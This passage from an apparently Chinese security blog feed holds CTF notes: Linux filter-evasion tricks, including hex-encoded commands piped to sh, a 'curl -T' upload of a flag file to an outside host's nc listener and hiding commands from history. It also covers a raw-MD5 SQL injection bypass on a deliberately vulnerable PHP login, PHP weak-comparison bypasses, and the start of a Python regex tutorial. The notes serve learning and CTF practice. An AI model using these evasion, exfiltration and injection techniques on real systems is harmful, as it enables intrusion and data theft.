class="line">root</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203091351029.png" alt="image-20191203091351029"></p><p><strong>xxd（16进制）</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Tao:/tmp<span class="comment"># printf &quot;whoami&quot; | xxd -p</span></span><br><span class="line">77686f616d69</span><br><span class="line">root@Tao:/tmp<span class="comment"># printf &quot;77686f616d69&quot; | xxd -r -p | sh</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203091508479.png" alt="image-20191203091508479"></p><h2 id="字符替换"><a href="#字符替换" class="headerlink" title="字符替换"></a>字符替换</h2><p>Linux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Tao:/tmp<span class="comment"># echo $PATH</span></span><br><span class="line">/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">root@Tao:/tmp<span class="comment"># echo $&#123;PATH:5:1&#125;</span></span><br><span class="line">l</span><br><span class="line">root@Tao:/tmp<span class="comment"># echo $&#123;PATH:2:1&#125;</span></span><br><span class="line">s</span><br><span class="line">root@Tao:/tmp<span class="comment"># echo $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;</span></span><br><span class="line">ls</span><br><span class="line">root@Tao:/tmp<span class="comment"># $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;</span></span><br><span class="line">flag.txt  tao.sh</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203091905836.png" alt="image-20191203091905836"></p><p> Linux：${PATH~: a :b}    其中a表示从a位开始，b表示截取的长度； （从0开始！！！）</p><p>如果过滤了冒号:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Tao:/tmp<span class="comment"># echo $(expr substr $PATH 6 1)</span></span><br><span class="line">l</span><br><span class="line">root@Tao:/tmp<span class="comment"># echo $(expr substr $PATH 3 1)</span></span><br><span class="line">s</span><br><span class="line">root@Tao:/tmp<span class="comment"># $(expr substr $PATH 6 1)$(expr substr $PATH 3 1)</span></span><br><span class="line">flag.txt  tao.sh</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203092308561.png" alt="image-20191203092308561"></p><p><strong>Windows:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">E:\tmp&gt;echo %PATH%:~13,1</span><br><span class="line">C:\Program Files (x86)\....</span><br><span class="line">E:\tmp&gt;echo %PATH:~14,1%</span><br><span class="line">e</span><br></pre></td></tr></table></figure><p> Windows：%PATH:~a,b%  (从1开始数)</p><h2 id="curl-T-上传文件"><a href="#curl-T-上传文件" class="headerlink" title="curl -T 上传文件"></a>curl -T 上传文件</h2><p>首先，windows主机监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\tmp&gt;nc.exe -l -v -p 2333</span><br></pre></td></tr></table></figure><p>Linux服务器发送文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -T .&#x2F;flag.txt http:&#x2F;&#x2F;1.1.1.1:2333</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203093411601.png" alt="image-20191203093411601"></p><h2 id="防止命令被记录"><a href="#防止命令被记录" class="headerlink" title="防止命令被记录"></a>防止命令被记录</h2><p>在终端执行的每一条命令都会被记录在 history 文件中？</p><p>不是的，如果在命令前加个<code>空格</code>，则会不被记录；</p><p>并且前后重复的命令不会被记录；</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203093836873.png" alt="image-20191203093836873"></p><p>note：</p><p>debain系可以，centos系不行；</p><h2 id="利用文件名执行命令"><a href="#利用文件名执行命令" class="headerlink" title="利用文件名执行命令"></a>利用文件名执行命令</h2><p> <code>*</code>是Linux下的通配符，它会将符合模式的文件列出来，之后执行； </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Tao:/tmp<span class="comment"># ls</span></span><br><span class="line">root@Tao:/tmp<span class="comment"># touch bash</span></span><br><span class="line">root@Tao:/tmp<span class="comment"># echo id &gt;&gt; tao.bash</span></span><br><span class="line">root@Tao:/tmp<span class="comment"># ls</span></span><br><span class="line">bash  tao.bash</span><br><span class="line">root@Tao:/tmp<span class="comment"># *</span></span><br><span class="line">uid=0(root) gid=0(root) 缁�=0(root)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203094014805.png" alt="image-20191203094014805"></p><p>参考文章:  <a href="https://ai-sewell.me/2017/Some-tricks-of-Linux-in-CTF/">https://ai-sewell.me/2017/Some-tricks-of-Linux-in-CTF/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;CTF中各种花里胡哨的操作还是挺多的，这里参考大佬的文章，做了更详细的总结！&lt;/p&gt;
&lt;h2 id=&quot;场景一：限制空格&quot;&gt;&lt;a href=&quot;#场景一：限制空格&quot; class=&quot;headerlink&quot; title=&quot;场景一：限制空格&quot;&gt;&lt;/a&gt;场景一：限制空格&lt;/h2&gt;&lt;p&gt;</summary>
      
    
    
    
    <category term="网络安全" scheme="http://www.ywboy.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="CTF" scheme="http://www.ywboy.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>MD5加密后的SQL注入(骚操作)</title>
    <link href="http://www.ywboy.cn/2020/10/04/MD5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84SQL%E6%B3%A8%E5%85%A5-%E9%AA%9A%E6%93%8D%E4%BD%9C/"/>
    <id>http://www.ywboy.cn/2020/10/04/MD5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84SQL%E6%B3%A8%E5%85%A5-%E9%AA%9A%E6%93%8D%E4%BD%9C/</id>
    <published>2020-10-04T01:19:11.000Z</published>
    <updated>2020-10-28T07:26:42.620Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>事情的起因是,我在看一篇大佬写的writeup,关于<code>sniperoj-web</code>的解析，我发现了一个关于MD5加密sql注入的骚操作，我便自己开始搭环境，准备复现一波</p><p>我这里利用的是dvwa的账号密码的环境</p><p> <img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191117094144398.png" alt="image-20191117094144398"></p><p><code>5f4dcc3b5aa765d61d8327deb882cf99</code>放到MD5解密网站解密为<code>password</code>，这我就不详细说了</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>关于这里sql注入，大佬是这样说的</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191117094459258.png" alt="image-20191117095108380"></p><p>于是我之前搭建环境，进行了测试.(以下是我自己为了测试，写的代码)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">USERNAME:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">PASSWORD:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;sub&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$host = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">$user = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">$passwd = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;sub&#x27;</span>]))&#123;</span><br><span class="line">$username = $_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">$conn = <span class="keyword">new</span> PDO(<span class="string">&quot;mysql:host=<span class="subst">$host</span>;dbname=dvwa&quot;</span>, $user, $passwd);</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM users WHERE password = &#x27;&quot;</span>.md5($password,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>; <span class="comment">// 重点在这里</span></span><br><span class="line">$q = $conn-&gt;query($sql);</span><br><span class="line">$res = $q-&gt;fetch();</span><br><span class="line"><span class="keyword">if</span> ($username == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> $res[<span class="string">&#x27;password&#x27;</span>] == md5(<span class="string">&#x27;password&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> $username.<span class="string">&#x27;登录成功！&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;请登入！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>大概的原理就是<code>$sql = &quot;SELECT * FROM users WHERE password = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</code> </p><p>上述的查询语句，如果<code>$password= ffifdyop </code> , md5后，<code>276f722736c95d99e921722cf9ed621c </code>， 再转成字符串：  ‘or’6<trash> </p><p>那么sql语句就成了<code>SELECT * FROM users WHERE password = &#39;&#39;or&#39;6&lt;trash&gt;&#39; </code>,从而绕过</p><p>我们进行测试：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191117095108380.png" alt="image-20191117094459258"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html">https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html</a> </li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;事情的起因是,我在看一篇大佬写的writeup,关于&lt;code&gt;sniperoj-web&lt;/code&gt;的解析，我发现了一个关于MD5加密sq</summary>
      
    
    
    
    <category term="PHP" scheme="http://www.ywboy.cn/categories/PHP/"/>
    
    <category term="web安全" scheme="http://www.ywboy.cn/categories/PHP/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php安全" scheme="http://www.ywboy.cn/tags/php%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP黑魔法学习总结</title>
    <link href="http://www.ywboy.cn/2020/10/04/PHP%E9%BB%91%E9%AD%94%E6%B3%95%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <id>http://www.ywboy.cn/2020/10/04/PHP%E9%BB%91%E9%AD%94%E6%B3%95%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</id>
    <published>2020-10-04T01:17:05.000Z</published>
    <updated>2020-10-04T01:30:43.952Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php黑魔法"><a href="#php黑魔法" class="headerlink" title="php黑魔法"></a>php黑魔法</h1><p>  php黑魔法就是所谓的弱类型比较，一些函数返回null,利用数组返回True的一些问题</p><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;betao.cn&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Ture&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;False&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="comment">// 以上代码输出 Ture</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">$b = <span class="string">&#x27;3betao.cn&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span> ($b &gt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;True&quot;</span>; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;False&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 以上代码说明了：若字符串以数字开头，则取开头数字作为转换结果，若无则输出0</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191115143819321.png" alt="image-20191115143819321"></p><p>总结： 以上代码说明了，若字符串以数字开头，则取开头数字作为转换结果，若无则输出0</p><h2 id="md5-sha1"><a href="#md5-sha1" class="headerlink" title="md5(),sha1()"></a>md5(),sha1()</h2><ol><li><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0 </p></li><li><p>md5()是不能处理数组的，md5(数组)会返回null，两个null相等绕过,sha1()也是同理</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;QNKCDZO&#x27;</span>;</span><br><span class="line">$b = <span class="string">&#x27;s878926199a&#x27;</span>;</span><br><span class="line">$md5_a = md5($a); <span class="keyword">echo</span> $md5_a.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$md5_b = md5($b); <span class="keyword">echo</span> $md5_b.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($md5_a == $md5_b)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;True&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;False&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191115151108336.png" alt="image-20191115144641604"></p><p>这种问题也叫MD5碰撞，更详细更多的可以参考我之前的文章：<a href="https://www.betao.cn/archives/md5same.html">https://www.betao.cn/archives/md5same.html</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> md5($a).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($b).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (md5($a) === md5($b))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;True&#x27;</span>; <span class="comment">// 输出True</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Flase&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// betao.cn</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191115145023251.png" alt="image-20191115145023251"></p><p>上面代码产生的原因为，md5不能处理数组，返回null</p><h2 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h2><p> php会自动进行转换，比如16进制，科学计数法等，有时也用这点绕过 </p><h2 id="strcmp函数数组绕过"><a href="#strcmp函数数组绕过" class="headerlink" title="strcmp函数数组绕过"></a>strcmp函数数组绕过</h2><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191115152253240.png" alt="image-20191115151108336"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (strcmp(<span class="string">&#x27;betao.cn&#x27;</span>, $a))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Flase&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;True&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191115151220918.png" alt="image-20191115151220918"></p><p>利用数组<code>a[]=1</code>, 返回True，成功绕过验证</p><p> strcmp()函数只有在相等的情况下返回0。<br>那么我们传入一个数组，它会返回NULL，而判断使用了，而NULL=0是bool(true)，这样就成功绕过。  </p><h2 id="ereg-或者-eregi"><a href="#ereg-或者-eregi" class="headerlink" title="ereg() 或者  eregi()"></a>ereg() 或者  eregi()</h2><p> <code>ereg()</code> 函数或 <code>eregi()</code> 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据 </p><p>详细的说明，参考： <a href="https://www.betao.cn/archives/giveup.html">https://www.betao.cn/archives/giveup.html</a> </p><h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h2><p> <strong>is_numeric()**作用： 判断变量是否为数字或数字字符串，不仅检查10进制，</strong>16进制**是可以 </p><ol><li><p><strong>当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过</strong> </p></li><li><p>16进制也可以绕过is_numeric()检验，可以用来绕过sql注入里的过滤 </p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">$c = is_numeric($a) <span class="keyword">and</span> is_numeric($b);</span><br><span class="line">var_dump(is_numeric($a));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump(is_numeric($b));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump($c);  <span class="comment">// 返回True</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$test = <span class="literal">false</span> <span class="keyword">and</span> <span class="literal">true</span>; <span class="comment">// 返回False</span></span><br><span class="line">var_dump($test);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191115153145283.png" alt="image-20191115152253240"></p><pre><code>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！该函数还可能造成sql注入，例如将‘1 or 1&#39;转换为16进制形式，再传参，就可以造成sql注入</code></pre><h2 id="switch"><a href="#switch" class="headerlink" title="switch()"></a>switch()</h2><p>当switch()没有break时可以继续往下执行<br>这里也有自动转换，比如$a = a,会当0执行，$a=1a，会当1执行……</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191115153842529.png" alt="image-20191115153145283"></p><h2 id="NULL-0-”0″-array-使用-和false比较时，都会返回true"><a href="#NULL-0-”0″-array-使用-和false比较时，都会返回true" class="headerlink" title="NULL,0,”0″,array()使用==和false比较时，都会返回true"></a>NULL,0,”0″,array()使用==和false比较时，都会返回true</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="literal">NULL</span>;</span><br><span class="line">$b = <span class="number">0</span>;</span><br><span class="line">$c = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">$d = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以下是三元运算符</span></span><br><span class="line"><span class="keyword">echo</span> $a == <span class="literal">false</span> ? <span class="string">&#x27;True&#x27;</span>: <span class="string">&#x27;False&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b == <span class="literal">false</span> ? <span class="string">&#x27;True&#x27;</span>: <span class="string">&#x27;False&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b == <span class="literal">false</span> ? <span class="string">&#x27;True&#x27;</span>: <span class="string">&#x27;False&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b == <span class="literal">false</span> ? <span class="string">&#x27;True&#x27;</span>: <span class="string">&#x27;False&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191115144641604.png" alt="image-20191115153842529"></p><h2 id="php-伪协议绕过"><a href="#php-伪协议绕过" class="headerlink" title="php://伪协议绕过"></a>php://伪协议绕过</h2><p>接收参数中不能出现某一字符，但下面又必须使用可以<code>php://伪协议</code>绕过</p><p>目前遇到的是<code>file_get_contents()</code>,其他情况具体而定</p><h2 id="array-search"><a href="#array-search" class="headerlink" title="array_search()"></a>array_search()</h2><p> 用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;php黑魔法&quot;&gt;&lt;a href=&quot;#php黑魔法&quot; class=&quot;headerlink&quot; title=&quot;php黑魔法&quot;&gt;&lt;/a&gt;php黑魔法&lt;/h1&gt;&lt;p&gt;  php黑魔法就是所谓的弱类型比较，一些函数返回null,利用数组返回True的一些问题&lt;/p&gt;
&lt;h2 </summary>
      
    
    
    
    <category term="PHP" scheme="http://www.ywboy.cn/categories/PHP/"/>
    
    <category term="web安全" scheme="http://www.ywboy.cn/categories/PHP/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php安全" scheme="http://www.ywboy.cn/tags/php%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Python正则表达式(入门到进阶)</title>
    <link href="http://www.ywboy.cn/2020/10/04/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E5%85%A5%E9%97%A8%E5%88%B0%E8%BF%9B%E9%98%B6/"/>
    <id>http://www.ywboy.cn/2020/10/04/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E5%85%A5%E9%97%A8%E5%88%B0%E8%BF%9B%E9%98%B6/</id>
    <published>2020-10-04T01:13:16.000Z</published>
    <updated>2020-10-04T01:14:37.787Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Python-gt-re"><a href="#Python-gt-re" class="headerlink" title="Python-&gt;re"></a>Python-&gt;re</h2><p>  之前想着玩爬虫，特意找一些大佬的文章学的，使用<code>jupyter notebook</code>写的,以下是导出成markdown语法形成的样子，一些更细节的解释，可以参看文末大佬总结的文章。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">str1 = <span class="string">&quot;&lt;table&gt;&lt;tr&gt;hello world 18111234589&lt;tr&gt;&lt;tr&gt;&lt;span&gt;name:张三,tel:18711001111&lt;/span&gt;&lt;/tr&gt;&lt;/table&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">需求：</span></span><br><span class="line"><span class="string">1.提取字符串中&lt;span&gt;标签里的内容；</span></span><br><span class="line"><span class="string">2.提取其中所有的手机号；</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#第一题:</span></span><br><span class="line">start = str1.find(<span class="string">&#x27;&lt;span&gt;&#x27;</span>)</span><br><span class="line">end = str1.rfind(<span class="string">&#x27;&lt;/span&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> start != <span class="number">-1</span>:</span><br><span class="line">    print(str1[start+len(<span class="string">&#x27;&lt;span&gt;&#x27;</span>):end])</span><br><span class="line"></span><br><span class="line"><span 